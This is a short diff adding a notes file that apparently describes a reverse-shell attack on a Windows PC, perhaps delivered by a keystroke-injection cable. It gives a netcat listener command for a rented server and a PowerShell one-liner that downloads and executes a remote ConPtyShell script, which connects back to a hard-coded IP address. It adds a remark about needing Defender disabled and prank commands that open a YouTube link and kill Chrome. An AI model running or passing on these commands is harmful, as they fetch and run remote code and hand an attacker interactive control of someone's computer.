@@ -1,0 +1,18 @@
+instructions:
+https://www.dropbox.com/s/5ai8ex6rkif4bql/OMG%20Reverse%20shell%20updated%20v3.pdf?dl=0
+https://www.youtube.com/watch?v=KhwJ6fD-t10&list=PLxyxkY7PPRIqWr4stfSxmj6TQH0YUQdFR&index=12
+
+linode server:
+stty raw -echo; (stty size; cat) | nc -lvnp 81
+
+
+on Windows PC:
+# only works when windows defender (real-time-protection) is off
+# Replace 10.1.1.1 with your server IP address and 81 with the port number
+IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 139.144.60.23 81
+
+start chrome:
+start chrome https://youtu.be/dQw9WgXcQ -WindowStyle maximized
+
+kill chrome:
+taskkill /IM "chrome.exe" /F
